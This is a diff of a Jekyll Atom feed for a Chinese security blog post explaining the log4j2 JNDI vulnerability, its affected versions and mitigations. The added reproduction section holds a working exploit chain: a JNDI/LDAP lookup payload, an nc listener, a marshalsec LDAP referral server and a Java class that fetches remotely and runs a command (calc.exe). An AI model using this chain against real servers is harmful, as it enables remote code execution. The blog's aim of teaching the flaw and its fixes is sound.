@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://dzxindex.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://dzxindex.github.io/" rel="alternate" type="text/html" /><updated>2021-12-14T17:15:25+08:00</updated><id>https://dzxindex.github.io/feed.xml</id><title type="html">学习博客</title><subtitle>安全&amp;代码 学习博客</subtitle><author><name>Zhuang Ma</name></author><entry><title type="html">log4j2 一个JAVA的大漏洞</title><link href="https://dzxindex.github.io/2021/12/14/CVE-log4j2/" rel="alternate" type="text/html" title="log4j2 一个JAVA的大漏洞" /><published>2021-12-14T00:00:00+08:00</published><updated>2021-12-14T00:00:00+08:00</updated><id>https://dzxindex.github.io/2021/12/14/CVE-log4j2</id><content type="html" xml:base="https://dzxindex.github.io/2021/12/14/CVE-log4j2/">&lt;h1 id=&quot;log4j2-网络安全史册上的漏洞&quot;&gt;log4j2 网络安全史册上的漏洞&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://dzxindex.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://dzxindex.github.io/" rel="alternate" type="text/html" /><updated>2021-12-14T17:31:59+08:00</updated><id>https://dzxindex.github.io/feed.xml</id><title type="html">学习博客</title><subtitle>安全&amp;代码 学习博客</subtitle><author><name>Zhuang Ma</name></author><entry><title type="html">log4j2 一个JAVA的大漏洞</title><link href="https://dzxindex.github.io/2021/12/14/CVE-log4j2/" rel="alternate" type="text/html" title="log4j2 一个JAVA的大漏洞" /><published>2021-12-14T00:00:00+08:00</published><updated>2021-12-14T00:00:00+08:00</updated><id>https://dzxindex.github.io/2021/12/14/CVE-log4j2</id><content type="html" xml:base="https://dzxindex.github.io/2021/12/14/CVE-log4j2/">&lt;h1 id=&quot;log4j2-网络安全史册上的漏洞&quot;&gt;log4j2 网络安全史册上的漏洞&lt;/h1&gt;
 
 &lt;p&gt;不管是什么编程语言，不管是前端后端还是客户端，对打日志都不会陌生。&lt;/p&gt;
 
@@ -49,7 +49,7 @@ logger.info(&quot;client ip: {}&quot;, clientIp)
   &lt;p&gt;有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h2 id=&quot;漏洞原理&quot;&gt;漏洞原理&lt;/h2&gt;
+&lt;h2 id=&quot;二漏洞原理&quot;&gt;二、漏洞原理&lt;/h2&gt;
 
 &lt;p&gt;好了，有了以上的基础，再来理解这个漏洞就很容易了。&lt;/p&gt;
 
@@ -113,7 +113,9 @@ logger.info(userAgent);
 
 &lt;p&gt;前面的例子中，一直用的127.0.0.1来代替LDAP服务器地址，那如果输入的User-Agent字符串中不是这个地址，而是一个恶意服务器地址呢？&lt;/p&gt;
 
-&lt;h2 id=&quot;影响规模&quot;&gt;影响规模&lt;/h2&gt;
+&lt;h2 id=&quot;影响范围&quot;&gt;影响范围&lt;/h2&gt;
+
+&lt;h3 id=&quot;影响规模&quot;&gt;影响规模&lt;/h3&gt;
 
 &lt;p&gt;这一次漏洞的影响面之所以如此之大，主要还是log4j2的使用面实在是太广了。&lt;/p&gt;
 
@@ -122,7 +124,7 @@ logger.info(userAgent);
 &lt;p&gt;可能的受影响应用包括但不限于如下：
 Apache Struts2、Apache Solr、Apache Flink、Apache Druid、ElasticSearch、flume、dubbo、Redis、logstash、kafka&lt;/p&gt;
 
-&lt;h2 id=&quot;影响版本&quot;&gt;影响版本&lt;/h2&gt;
+&lt;h3 id=&quot;影响版本&quot;&gt;影响版本&lt;/h3&gt;
 
 &lt;p&gt;此次受影响版本如下：&lt;/p&gt;
 
@@ -149,7 +151,93 @@ Apache Struts2、Apache Solr、Apache Flink、Apache Druid、ElasticSearch、flu
 （3） 将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;h2 id=&quot;二漏洞复现&quot;&gt;二、漏洞复现&lt;/h2&gt;
+&lt;h2 id=&quot;三漏洞复现&quot;&gt;三、漏洞复现&lt;/h2&gt;
+
+&lt;h3 id=&quot;poc验证&quot;&gt;POC验证&lt;/h3&gt;
+
+&lt;p&gt;1.添加log4j2相关jar包（maven）&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;dependency&amp;gt;
+    &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt;
+    &amp;lt;artifactId&amp;gt;log4j-api&amp;lt;/artifactId&amp;gt;
+    &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt;
+&amp;lt;/dependency&amp;gt;
+&amp;lt;dependency&amp;gt;
+    &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt;
+    &amp;lt;artifactId&amp;gt;log4j-core&amp;lt;/artifactId&amp;gt;
+    &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt;
+&amp;lt;/dependency&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;2.POC代码&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class Log4jTest {
+    public static void main(String[] args) {
+        Logger logger = LogManager.getLogger();
+	//127.0.0.1:9999 可替换成dnslog平台或vps地址
+        logger.error(&quot;${jndi:ldap://127.0.0.1:9999/}&quot;);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;3.Vps上使用nc开启监听&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# nc -lvvp 9999
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;4.运行java代码&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;有连接信息
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;修改配置log4j2.formatMsgNoLookups=True&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;再次运行代码发现nc没有连接信息，缓解措施有效&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;exploit-执行calc命令&quot;&gt;Exploit 执行calc命令&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;编写ExpCalc.java&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class ExpCalc{
+    public ExpCalc() throws Exception {
+        Runtime.getRuntime().exec(new String[]{&quot;cmd.exe&quot;,&quot;/c&quot;, &quot;calc.exe&quot;});
+    }
+
+    public static void main(String[] args) throws Exception {
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;2.编译class文件放到服务器上&lt;/p&gt;
+
+&lt;p&gt;javac ExpCalc.java&lt;/p&gt;
+
+&lt;p&gt;可以使用python3搭建httpserver
+python3  -m  http.server 9999&lt;/p&gt;
+
+&lt;p&gt;3.使用marshalsec生成jndi服务&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java		-cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:9999/#ExpCalc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;4.运行payload，即可执行命令，弹出计算器&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;logger.error(&quot;${jndi:ldap://127.0.0.1:9999/ExpCalc}&quot;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;注意&quot;&gt;注意！！！&lt;/h2&gt;
+
+&lt;p&gt;仅供学习参考,禁止传播！！！ 作者概不负责&lt;/p&gt;
 
 &lt;h2 id=&quot;转载&quot;&gt;转载&lt;/h2&gt;
 
